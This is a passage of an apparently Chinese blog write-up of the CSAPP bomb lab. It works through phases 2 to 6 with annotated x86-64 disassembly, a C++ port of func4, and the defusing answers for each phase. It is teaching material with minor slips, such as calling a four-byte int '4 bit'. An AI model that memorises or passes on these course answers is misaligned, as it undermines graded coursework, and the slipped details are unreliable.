%rbp 寄存器的值</span><br><span class="line">0x0000000000400f42 &lt;+70&gt;:    retq                    ; 从函数中返回</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这是一个简单的倍增循环,需要知道stack的概念.</p>
<p>一开始能够简单的确定stack上的第一个元素与1是相等的</p>
<p>然后把第二个元素的地址加载到rbx上,因为里面存的是int,int是4个bit,所以每次加四,然后把前一个值加倍看他是否与当前值相等.</p>
<p>故六次循环后我们会发现每次循环能不断推断出第一个,第二个,直到第六个元素,为倍增关系</p>
<p>故答案: 1 2 4 8 16 32</p>
<p>代码混淆解释</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rbx=rsp+4  //lea 0x4(%rsp),%rbx</span><br><span class="line">rbx=*(rsp+4) //mov 0x4(%rsp),%rbx</span><br></pre></td></tr></table></figure>

<h2 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h2><p>人工打了跳转标记</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000400f43 &lt;phase_3&gt;:</span><br><span class="line">  400f43:	48 83 ec 18          	sub    $0x18,%rsp</span><br><span class="line">  400f47:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx</span><br><span class="line">  400f4c:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx</span><br><span class="line">  400f51:	be cf 25 40 00       	mov    $0x4025cf,%esi</span><br><span class="line">  400f56:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  400f5b:	e8 90 fc ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  400f60:	83 f8 01             	cmp    $0x1,%eax</span><br><span class="line">  400f63:	7f 05                	jg     .L1</span><br><span class="line">  400f65:	e8 d0 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  .L1</span><br><span class="line">  400f6a:	83 7c 24 08 07       	cmpl   $0x7,0x8(%rsp)</span><br><span class="line">  400f6f:	77 3c                	ja     .L2</span><br><span class="line">  400f71:	8b 44 24 08          	mov    0x8(%rsp),%eax</span><br><span class="line">  400f75:	ff 24 c5 70 24 40 00 	jmpq   *0x402470(,%rax,8)</span><br><span class="line">  400f7c:	b8 cf 00 00 00       	mov    $0xcf,%eax</span><br><span class="line">  400f81:	eb 3b                	jmp    .L3</span><br><span class="line">  400f83:	b8 c3 02 00 00       	mov    $0x2c3,%eax</span><br><span class="line">  400f88:	eb 34                	jmp    .L3</span><br><span class="line">  400f8a:	b8 00 01 00 00       	mov    $0x100,%eax</span><br><span class="line">  400f8f:	eb 2d                	jmp    .L3</span><br><span class="line">  400f91:	b8 85 01 00 00       	mov    $0x185,%eax</span><br><span class="line">  400f96:	eb 26                	jmp    .L3</span><br><span class="line">  400f98:	b8 ce 00 00 00       	mov    $0xce,%eax</span><br><span class="line">  400f9d:	eb 1f                	jmp    .L3</span><br><span class="line">  400f9f:	b8 aa 02 00 00       	mov    $0x2aa,%eax</span><br><span class="line">  400fa4:	eb 18                	jmp    .L3</span><br><span class="line">  400fa6:	b8 47 01 00 00       	mov    $0x147,%eax</span><br><span class="line">  400fab:	eb 11                	jmp    .L3</span><br><span class="line">  .L2 </span><br><span class="line">  400fad:	e8 88 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400fb2:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  400fb7:	eb 05                	jmp    .L3</span><br><span class="line">  400fb9:	b8 37 01 00 00       	mov    $0x137,%eax</span><br><span class="line">  .L3</span><br><span class="line">  400fbe:	3b 44 24 0c          	cmp    0xc(%rsp),%eax</span><br><span class="line">  400fc2:	74 05                	je    .L4</span><br><span class="line">  400fc4:	e8 71 04 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  .L4</span><br><span class="line">  400fc9:	48 83 c4 18          	add    $0x18,%rsp</span><br><span class="line">  400fcd:	c3                   	retq   </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>gpt解读</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000400f43 &lt;phase_3&gt;:</span><br><span class="line">  400f43:	48 83 ec 18          	sub    $0x18,%rsp          ; 为局部变量分配空间</span><br><span class="line">  400f47:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx     ; 将局部变量地址加载到寄存器 rcx 中</span><br><span class="line">  400f4c:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx     ; 将局部变量地址加载到寄存器 rdx 中</span><br><span class="line">  400f51:	be cf 25 40 00       	mov    $0x4025cf,%esi      ; 将常量地址加载到寄存器 esi 中</span><br><span class="line">  400f56:	b8 00 00 00 00       	mov    $0x0,%eax          ; 清零寄存器 eax</span><br><span class="line">  400f5b:	e8 90 fc ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;  ; 调用 sscanf 函数，将输入解析为整数,</span><br><span class="line">  400f60:	83 f8 01             	cmp    $0x1,%eax          ; 比较返回值与1</span><br><span class="line">  400f63:	7f 05                	jg     .L1                ; 如果大于1，跳转到.L1</span><br><span class="line">  400f65:	e8 d0 04 00 00       	callq  40143a &lt;explode_bomb&gt;  ; 否则，调用 explode_bomb 函数</span><br><span class="line">  .L1</span><br><span class="line">  400f6a:	83 7c 24 08 07       	cmpl   $0x7,0x8(%rsp)    ; 比较第二个局部变量和7,0x8(%rsp)要小于7(无符号类型)</span><br><span class="line">  400f6f:	77 3c                	ja     .L2                ; 如果大于7，跳转到.L2</span><br><span class="line">  400f71:	8b 44 24 08          	mov    0x8(%rsp),%eax    ; 将第二个局部变量加载到寄存器 eax 中</span><br><span class="line">  400f75:	ff 24 c5 70 24 40 00 	jmpq   *0x402470(,%rax,8)  ; 通过跳转表间接调用不同的分支(%rax*8+*402470)</span><br><span class="line">  400f7c:	b8 cf 00 00 00       	mov    $0xcf,%eax        ; 第一种分支1:</span><br><span class="line">  400f81:	eb 3b                	jmp    .L3                ; 跳转到.L3</span><br><span class="line">  400f83:	b8 c3 02 00 00       	mov    $0x2c3,%eax       ; 第二种分支:2</span><br><span class="line">  400f88:	eb 34                	jmp    .L3                ; 跳转到.L3</span><br><span class="line">  400f8a:	b8 00 01 00 00       	mov    $0x100,%eax       ; 第三种分支.输入为3</span><br><span class="line">  400f8f:	eb 2d                	jmp    .L3                ; 跳转到.L3</span><br><span class="line">  400f91:	b8 85 01 00 00       	mov    $0x185,%eax       ; 第四种分支:4</span><br><span class="line">  400f96:	eb 26                	jmp    .L3                ; 跳转到.L3</span><br><span class="line">  400f98:	b8 ce 00 00 00       	mov    $0xce,%eax        ; 第五种分支</span><br><span class="line">  400f9d:	eb 1f                	jmp    .L3                ; 跳转到.L3</span><br><span class="line">  400f9f:	b8 aa 02 00 00       	mov    $0x2aa,%eax       ; 第六种分支</span><br><span class="line">  400fa4:	eb 18                	jmp    .L3                ; 跳转到.L3</span><br><span class="line">  400fa6:	b8 47 01 00 00       	mov    $0x147,%eax       ; 第七种分支</span><br><span class="line">  400fab:	eb 11                	jmp    .L3                ; 跳转到.L3</span><br><span class="line">  .L2 </span><br><span class="line">  400fad:	e8 88 04 00 00       	callq  40143a &lt;explode_bomb&gt;  ; 如果第二个局部变量大于7，调用 explode_bomb 函数</span><br><span class="line">  400fb2:	b8 00 00 00 00       	mov    $0x0,%eax          ; 将返回值清零</span><br><span class="line">  400fb7:	eb 05                	jmp    .L3                ; 跳转到.L3</span><br><span class="line">  400fb9:	b8 37 01 00 00       	mov    $0x137,%eax       ; 第八种分支</span><br><span class="line">  .L3</span><br><span class="line">  400fbe:	3b 44 24 0c          	cmp    0xc(%rsp),%eax    ; 比较第三个局部变量和返回值 </span><br><span class="line">  400fc2:	74 05                	je    .L4                ; 如果相等，跳转到.L4</span><br><span class="line">  400fc4:	e8 71 04 00 00       	callq  40143a &lt;explode_bomb&gt;  ; 否则，调用 explode_bomb 函数</span><br><span class="line">  .L4</span><br><span class="line">  400fc9:	48 83 c4 18          	add    $0x18,%rsp         ; 函数结束，恢复栈空间</span><br><span class="line">  400fcd:	c3                   	retq                      ; 返回</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>_isoc99_sscanf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">其转换了含有几个整数的字符串则返回值是几</span><br></pre></td></tr></table></figure>



<ul>
<li><code>0x0(%rsp)</code> 是栈顶位置，通常是函数的返回地址。</li>
<li><code>0x4(%rsp)</code> 是栈顶位置向下偏移4字节的位置，可能是一个局部变量或参数。</li>
</ul>
<p>在这么多条分支里面找到一条能成立的就可以了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jmpq   *0x402470(,%rax,8) </span><br></pre></td></tr></table></figure>

<p>这个函数是重点,这是跳转表间接实现switch操作,先确定输入的第一个变量在[0,7]之间,首先用gdb指令确定*0x402470的值,假定其会跳转到第一个分支,即令第一个变量等于0,刚好能跳转到第一个分支,那想要炸弹不爆炸只能%eax&#x3D;207,所以其中一种答案就算出来了</p>
<p>答案 0 207</p>
<h2 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  ;设第一个数字为a,第二个数字为b</span><br><span class="line">  0x000000000040100c &lt;+0&gt;:     sub    $0x18,%rsp</span><br><span class="line">  0x0000000000401010 &lt;+4&gt;:     lea    0xc(%rsp),%rcx</span><br><span class="line">  0x0000000000401015 &lt;+9&gt;:     lea    0x8(%rsp),%rdx</span><br><span class="line">  0x000000000040101a &lt;+14&gt;:    mov    $0x4025cf,%esi</span><br><span class="line">  0x000000000040101f &lt;+19&gt;:    mov    $0x0,%eax</span><br><span class="line">  0x0000000000401024 &lt;+24&gt;:    callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;;读入</span><br><span class="line">  0x0000000000401029 &lt;+29&gt;:    cmp    $0x2,%eax;个数为2</span><br><span class="line">  0x000000000040102c &lt;+32&gt;:    jne    0x401035 &lt;phase_4+41&gt;</span><br><span class="line">  0x000000000040102e &lt;+34&gt;:    cmpl   $0xe,0x8(%rsp);比较a和0xe,a&lt;=0xe=14</span><br><span class="line">  0x0000000000401033 &lt;+39&gt;:    jbe    .L1</span><br><span class="line">  0x0000000000401035 &lt;+41&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">.L1</span><br><span class="line"> 0x000000000040103a &lt;+46&gt;:    mov    $0xe,%edx;往里面塞两个值edx,esi更新;</span><br><span class="line">  0x000000000040103f &lt;+51&gt;:    mov    $0x0,%esi</span><br><span class="line">  0x0000000000401044 &lt;+56&gt;:    mov    0x8(%rsp),%edi;edi=a</span><br><span class="line">  0x0000000000401048 &lt;+60&gt;:    callq  0x400fce &lt;func4&gt;;调用func4</span><br><span class="line">  0x000000000040104d &lt;+65&gt;:    test   %eax,%eax;还要看eax是否为0,即返回值是否为0,结合后文,返回值要0</span><br><span class="line">  0x000000000040104f &lt;+67&gt;:    jne    .L2</span><br><span class="line">  0x0000000000401051 &lt;+69&gt;:    cmpl   $0x0,0xc(%rsp);故b=0</span><br><span class="line">  0x0000000000401056 &lt;+74&gt;:    je     0x40105d &lt;phase_4+81&gt;</span><br><span class="line">  .L2</span><br><span class="line">  0x0000000000401058 &lt;+76&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">  0x000000000040105d &lt;+81&gt;:    add    $0x18,%rsp</span><br><span class="line">  0x0000000000401061 &lt;+85&gt;:    retq</span><br></pre></td></tr></table></figure>

<p>现在我们要确定数字a,b,已知b&#x3D;0,故要确定a的值</p>
<p>补充资料</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rdi：第一个参数</span><br><span class="line">rsi：第二个参数</span><br><span class="line">rdx：第三个参数</span><br><span class="line">rcx：第四个参数</span><br><span class="line">r8：第五个参数</span><br><span class="line">r9：第六个参数</span><br></pre></td></tr></table></figure>

<p><func4>#目标是让rax即返回值是0</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;rdi=a;edx=e;esi=0</span><br><span class="line">  .L3</span><br><span class="line">  0x0000000000400fce &lt;+0&gt;:     sub    $0x8,%rsp</span><br><span class="line">  # retval=rdx</span><br><span class="line">   0x0000000000400fd2 &lt;+4&gt;:     mov    %edx,%eax  </span><br><span class="line">   #retval-=rsi</span><br><span class="line">   0x0000000000400fd4 &lt;+6&gt;:     sub    %esi,%eax</span><br><span class="line">   0x0000000000400fd6 &lt;+8&gt;:     mov    %eax,%ecx</span><br><span class="line">   0x0000000000400fd8 &lt;+10&gt;:    shr    $0x1f,%ecx#右移31位==&gt;取符号位</span><br><span class="line">   0x0000000000400fdb &lt;+13&gt;:    add    %ecx,%eax</span><br><span class="line"></span><br><span class="line">   ---</span><br><span class="line">   0x0000000000400fdd &lt;+15&gt;:    sar    %eax ;eax/=2;ret=ret&gt;&gt;1</span><br><span class="line">   0x0000000000400fdf &lt;+17&gt;:    lea    (%rax,%rsi,1),%ecx;ecx=rax+rsi</span><br><span class="line">   </span><br><span class="line">   0x0000000000400fe2 &lt;+20&gt;:    cmp    %edi,%ecx;&lt;=</span><br><span class="line">   #if(ecx==edi)return 0</span><br><span class="line">   #if(ecx&lt;edi)func()</span><br><span class="line">   0x0000000000400fe4 &lt;+22&gt;:    jle    .L1</span><br><span class="line">   0x0000000000400fe6 &lt;+24&gt;:    lea    -0x1(%rcx),%edx</span><br><span class="line">   0x0000000000400fe9 &lt;+27&gt;:    callq  0x400fce &lt;func4&gt;</span><br><span class="line">   </span><br><span class="line">   0x0000000000400fee &lt;+32&gt;:    add    %eax,%eax#倍增</span><br><span class="line">   0x0000000000400ff0 &lt;+34&gt;:    jmp    .L2</span><br><span class="line">  .L1</span><br><span class="line">  0x0000000000400ff2 &lt;+36&gt;:    mov    $0x0,%eax;</span><br><span class="line">  </span><br><span class="line">   0x0000000000400ff7 &lt;+41&gt;:    cmp    %edi,%ecx</span><br><span class="line">   0x0000000000400ff9 &lt;+43&gt;:    jge    .L2</span><br><span class="line">   #esi=rcx+1</span><br><span class="line">   0x0000000000400ffb &lt;+45&gt;:    lea    0x1(%rcx),%esi</span><br><span class="line">   0x0000000000400ffe &lt;+48&gt;:    .L3;调回到开头,即为一次递归调用,观察其改变什么值就可以了</span><br><span class="line">   ;即返回值ret后要再倍增+1</span><br><span class="line">   0x0000000000401003 &lt;+53&gt;:    lea    0x1(%rax,%rax,1),%eax;2*%rax+1</span><br><span class="line">   .L2</span><br><span class="line">   0x0000000000401007 &lt;+57&gt;:    add    $0x8,%rsp</span><br><span class="line">   0x000000000040100b &lt;+61&gt;:    retq</span><br></pre></td></tr></table></figure>

<p>观察如何让rax&#x3D;0;</p>
<p>把它按行翻译为c++代码,然后跑一遍就好了</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//int rdi=x,edx=a1,esi=a2,rcx=tmp</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">int</span> a1,<span class="type">int</span> a2,<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"><span class="comment">//ret=a1</span></span></span><br><span class="line"><span class="function"><span class="comment">//ret-=a2</span></span></span><br><span class="line"><span class="function"><span class="comment">//int tmp=ret</span></span></span><br><span class="line"><span class="function"><span class="comment">//tmp&gt;&gt;31</span></span></span><br><span class="line"><span class="function">tmp</span>=(a1-a2)&gt;&gt;<span class="number">31</span>;</span><br><span class="line">ret=(a1-a2+tmp)&gt;&gt;<span class="number">1</span></span><br><span class="line">tmp=ret+a2</span><br><span class="line"><span class="keyword">if</span>(tmp==x)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(tmp&lt;x)&#123;</span><br><span class="line">ret=<span class="built_in">func</span>(a1,tmp+<span class="number">1</span>,x)</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>*ret+<span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(tmp&gt;x)&#123;</span><br><span class="line"> ret=<span class="built_in">func</span>(a1<span class="number">-1</span>,a2,x)</span><br><span class="line"> <span class="keyword">return</span> <span class="number">2</span>*ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>测试代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">//int rdi=x,edx=a1,esi=a2,rcx=tmp</span></span><br><span class="line"><span class="comment">//rdi=x;edx=e;esi=0</span></span><br><span class="line"><span class="function"><span class="type">int</span>  <span class="title">func</span><span class="params">(<span class="type">int</span> a1,<span class="type">int</span> a2,<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line"><span class="comment">//ret=a1</span></span><br><span class="line"><span class="comment">//ret-=a2</span></span><br><span class="line"><span class="comment">//int tmp=ret</span></span><br><span class="line"><span class="comment">//tmp&gt;&gt;31</span></span><br><span class="line"><span class="type">int</span> tmp=(a1-a2)&gt;&gt;<span class="number">31</span>;</span><br><span class="line"><span class="type">int</span> ret=(a1-a2+tmp)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">tmp=ret+a2;</span><br><span class="line"><span class="keyword">if</span>(tmp==x)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(tmp&lt;x)&#123;</span><br><span class="line">ret=<span class="built_in">func</span>(a1,tmp+<span class="number">1</span>,x);</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>*ret+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(tmp&gt;x)&#123;</span><br><span class="line"> ret=<span class="built_in">func</span>(a1<span class="number">-1</span>,a2,x);</span><br><span class="line"> <span class="keyword">return</span> <span class="number">2</span>*ret;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">100</span>;i++)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="built_in">func</span>(<span class="number">14</span>,<span class="number">0</span>,i)&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后我们就能够很清楚的知道四个数字:0 1 3 7</p>
<p>所以答案有四种: </p>
<ul>
<li>0 0</li>
<li>1 0</li>
<li>3 0:</li>
<li>7 0</li>
</ul>
<h2 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401062 &lt;phase_5&gt;:  !# %fs:0x28 -&gt; 3678849592732380416 这是一个保护堆栈的值</span><br><span class="line">  401062:   53                      push   %rbx</span><br><span class="line">  401063:   48 83 ec 20             sub    $0x20,%rsp   !# 开了32字节</span><br><span class="line">  401067:   48 89 fb                mov    %rdi,%rbx    !# rbx 也是string </span><br><span class="line">  40106a:   64 48 8b 04 25 28 00    mov    %fs:0x28,%rax</span><br><span class="line">  401071:   00 00 </span><br><span class="line">  401073:   48 89 44 24 18          mov    %rax,0x18(%rsp) !# fs:0x28</span><br><span class="line">  401078:   31 c0                   xor    %eax,%eax</span><br><span class="line">  40107a:   e8 9c 02 00 00          callq  40131b &lt;string_length&gt; ;返回值是rax</span><br><span class="line">  40107f:   83 f8 06                cmp    $0x6,%eax       !# string_length 为6就去 4010d2 执行，否则爆炸</span><br><span class="line">  401082:   74 4e                   je     4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line">  401084:   e8 b1 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401089:   eb 47                   jmp    4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line">                                            !# 最初rax=0, 循环6次， 每次处理第 rax个字符</span><br><span class="line">  40108b:   0f b6 0c 03             movzbl (%rbx,%rax,1),%ecx  !# ecx = *rbx + *rax = *rdi + *rax 即第rax个字符</span><br><span class="line">  40108f:   88 0c 24                mov    %cl,(%rsp)          !# 栈顶 = cl                     即第rax个字符</span><br><span class="line">  401092:   48 8b 14 24             mov    (%rsp),%rdx         !# rdx = rsp = cl                即第rax个字符</span><br><span class="line">  401096:   83 e2 0f                and    $0xf,%edx           !# edx &amp;= 0xf, edx = cl 的低4位  即第rax个字符的低四位</span><br><span class="line">  401099:   0f b6 92 b0 24 40 00    movzbl 0x4024b0(%rdx),%edx !# 0x4024b0[*rdx] -&gt; edx</span><br><span class="line">  4010a0:   88 54 04 10             mov    %dl,0x10(%rsp,%rax,1) !dl -&gt; 0x10 + *rsp + *rax</span><br><span class="line">  4010a4:   48 83 c0 01             add    $0x1,%rax             !# *rax ++</span><br><span class="line">  4010a8:   48 83 f8 06             cmp    $0x6,%rax             !# rax != 0x6  即循环六次</span><br><span class="line">  4010ac:   75 dd                   jne    40108b &lt;phase_5+0x29&gt;</span><br><span class="line"></span><br><span class="line">  4010ae:   c6 44 24 16 00          movb   $0x0,0x16(%rsp)</span><br><span class="line">  4010b3:   be 5e 24 40 00          mov    $0x40245e,%esi      !# &quot;flyers&quot;</span><br><span class="line">  4010b8:   48 8d 7c 24 10          lea    0x10(%rsp),%rdi     !# 0x10(%rsp) ~ 0x15(%rsp)  和 &quot;flyers&quot;相等就跳转即成功了 否则爆炸</span><br><span class="line">  4010bd:   e8 76 02 00 00          callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">  4010c2:   85 c0                   test   %eax,%eax</span><br><span class="line">  4010c4:   74 13                   je     4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line">  4010c6:   e8 6f 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  4010cb:   0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)</span><br><span class="line">  4010d0:   eb 07                   jmp    4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line">  </span><br><span class="line">  4010d2:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  4010d7:   eb b2                   jmp    40108b &lt;phase_5+0x29&gt;;跳回40108b</span><br><span class="line"></span><br><span class="line">  4010d9:   48 8b 44 24 18          mov    0x18(%rsp),%rax</span><br><span class="line">  4010de:   64 48 33 04 25 28 00    xor    %fs:0x28,%rax  !# 如果相等就跳转则说明没有溢出</span><br><span class="line">  4010e5:   00 00 </span><br><span class="line">  4010e7:   74 05                   je     4010ee &lt;phase_5+0x8c&gt;</span><br><span class="line">  4010e9:   e8 42 fa ff ff          callq  400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">  4010ee:   48 83 c4 20             add    $0x20,%rsp</span><br><span class="line">  4010f2:   5b                      pop    %rbx</span><br><span class="line">  4010f3:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>啥逼玩意能通过偏移量达到flyers,取末尾四位,在来一遍这个地址</p>
<p>把这两个地址的所含字符串输出出来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov    $0x40245e,%esi </span><br><span class="line"> movzbl 0x4024b0(%rdx),%edx</span><br></pre></td></tr></table></figure>

<p>能找到这两个字符串</p>
<p>问题串:adui<strong>ers</strong>n<strong>f</strong>otvby<strong>l</strong>So you think you can stop the bomb with ctrl-c, do you?</p>
<p>转换后的串:flyers</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">40108b:   0f b6 0c 03             movzbl (%rbx,%rax,1),%ecx  !# ecx = *rbx + *rax = *rdi + *rax 即第rax个字符</span><br><span class="line">  40108f:   88 0c 24                mov    %cl,(%rsp)          !# 栈顶 = cl                     即第rax个字符</span><br><span class="line">  401092:   48 8b 14 24             mov    (%rsp),%rdx         !# rdx = rsp = cl                即第rax个字符</span><br><span class="line">  401096:   83 e2 0f                and    $0xf,%edx           !# edx &amp;= 0xf, edx = cl 的低4位  即第rax个字符的低四位</span><br></pre></td></tr></table></figure>

<p>即每次取输入字符串的一个字符,取其低四位,以此为索引,在问题串中找对应偏移量的字符,存入stack中,循环六次后,和转换后的串一比较,相等即通过</p>
<p>偏移公式:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">movzbl 0x4024b0(%rdx),%edx;0x4024b0是问题串的首位置</span><br><span class="line"> mov    %dl,0x10(%rsp,%rax,1);把它存起来,rax会递增,所以每个字符会一个一个存起来</span><br></pre></td></tr></table></figure>

<p>然后对着ascII码表算一算</p>
<ol>
<li>9&gt;&gt;Y</li>
<li>15&gt;&gt;o</li>
<li>14&gt;&gt;n</li>
<li>5&gt;&gt;e</li>
<li>6&gt;&gt;f</li>
<li>7&gt;&gt;g</li>
</ol>
<p>答案Yonefg(其中一种)</p>
<h2 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h2><p>设数串为a,b,c,d,e,f</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  0x00000000004010fc &lt;+8&gt;:     sub    $0x50,%rsp</span><br><span class="line">  0x0000000000401100 &lt;+12&gt;:    mov    %rsp,%r13</span><br><span class="line">  0x0000000000401103 &lt;+15&gt;:    mov    %rsp,%rsi</span><br><span class="line">  0x0000000000401106 &lt;+18&gt;:    callq  0x40145c &lt;read_six_numbers&gt;</span><br><span class="line">  0x000000000040110b &lt;+23&gt;:    mov    %rsp,%r14</span><br><span class="line">  0x000000000040110e &lt;+26&gt;:    mov    $0x0,%r12d</span><br><span class="line">  ;模块:即这六个数字,每个数只出现一遍且都出现</span><br><span class="line">  0x0000000000401114 &lt;+32&gt;:    mov    %r13,%rbp;r13的地址对应的值是第一个数字</span><br><span class="line">  0x0000000000401117 &lt;+35&gt;:    mov    0x0(%r13),%eax</span><br><span class="line">  0x000000000040111b &lt;+39&gt;:    sub    $0x1,%eax</span><br><span class="line">  0x000000000040111e &lt;+42&gt;:    cmp    $0x5,%eax;eax&gt;=0x5,故a&lt;=5</span><br><span class="line">  0x0000000000401121 &lt;+45&gt;:    jbe    .L1;&lt;=就不炸</span><br><span class="line">  .L1;上面的一些代码保证了每一个数字都是在[1,6]之间的</span><br><span class="line">  0x0000000000401128 &lt;+52&gt;:    add    $0x1,%r12d;r12d++</span><br><span class="line">  0x000000000040112c &lt;+56&gt;:    cmp    $0x6,%r12d;跑六次循环</span><br><span class="line">  0x0000000000401130 &lt;+60&gt;:    je     .L2</span><br><span class="line">  0x0000000000401132 &lt;+62&gt;:    mov    %r12d,%ebx;ebx=r12d</span><br><span class="line">  0x0000000000401135 &lt;+65&gt;:    movslq %ebx,%rax</span><br><span class="line">  0x0000000000401138 &lt;+68&gt;:    mov    (%rsp,%rax,4),%eax,;rax作为变量,会依次取出每一个元素,应为rsp对着的就是6,那么+1*4就是5(测试样例为6,5,4,3,2,1),每次的循环内层循环的辞书是下降的</span><br><span class="line">  0x000000000040113b &lt;+71&gt;:    cmp    %eax,0x0(%rbp)  ;0x0(%rbp)!=%eax,保证六个数字每个只出现一次</span><br><span class="line">  0x000000000040113e &lt;+74&gt;:    jne    0x401145 &lt;phase_6+81&gt;</span><br><span class="line">  0x0000000000401140 &lt;+76&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">  0x0000000000401145 &lt;+81&gt;:    add    $0x1,%ebx;ebx每次会加一,然后把值给到rax,故每次的eax是一个一个的从栈中取出元素</span><br><span class="line">  0x0000000000401148 &lt;+84&gt;:    cmp    $0x5,%ebx;会循环六次;这是内层循环</span><br><span class="line">  0x000000000040114b &lt;+87&gt;:    jle    0x401135 &lt;phase_6+65&gt;</span><br><span class="line">  0x000000000040114d &lt;+89&gt;:    add    $0x4,%r13;r13类似于一个栈的指针,每次会往下指一个元素然后重头遍历一遍</span><br><span class="line">  0x0000000000401151 &lt;+93&gt;:    jmp    0x401114 &lt;phase_6+32&gt;;这是外层循环</span><br><span class="line"> .L2</span><br><span class="line"> ;下一个模块:将每一个元素都变成7-int</span><br><span class="line"> 0x0000000000401153 &lt;+95&gt;:    lea    0x18(%rsp),%rsi;0,4,8,12,16,20,24</span><br><span class="line">  0x0000000000401158 &lt;+100&gt;:   mov    %r14,%rax</span><br><span class="line">  0x000000000040115b &lt;+103&gt;:   mov    $0x7,%ecx</span><br><span class="line">  0x0000000000401160 &lt;+108&gt;:   mov    %ecx,%edx</span><br><span class="line">  0x0000000000401162 &lt;+110&gt;:   sub    (%rax),%edx</span><br><span class="line">  0x0000000000401164 &lt;+112&gt;:   mov    %edx,(%rax)</span><br><span class="line">  0x0000000000401166 &lt;+114&gt;:   add    $0x4,%rax</span><br><span class="line">  0x000000000040116a &lt;+118&gt;:   cmp    %rsi,%rax;一共会循环六次</span><br><span class="line">  0x000000000040116d &lt;+121&gt;:   jne    0x401160 &lt;phase_6+108&gt;</span><br><span class="line">  </span><br><span class="line">  0x000000000040116f &lt;+123&gt;:   mov    $0x0,%esi</span><br><span class="line">  0x0000000000401174 &lt;+128&gt;:   jmp    0x401197 &lt;phase_6+163&gt;</span><br><span class="line">  ;这一段实现了把给定链表的数值倒序,根据权重把节点做一个移动</span><br><span class="line">  0x0000000000401176 &lt;+130&gt;:   mov    0x8(%rdx),%rdx</span><br><span class="line">  0x000000000040117a &lt;+134&gt;:   add    $0x1,%eax</span><br><span class="line">  0x000000000040117d &lt;+137&gt;:   cmp    %ecx,%eax</span><br><span class="line">  0x000000000040117f &lt;+139&gt;:   jne    0x401176 &lt;phase_6+130&gt;</span><br><span class="line">  0x0000000000401181 &lt;+141&gt;:   jmp    0x401188 &lt;phase_6+148&gt;</span><br><span class="line">  0x0000000000401183 &lt;+143&gt;:   mov    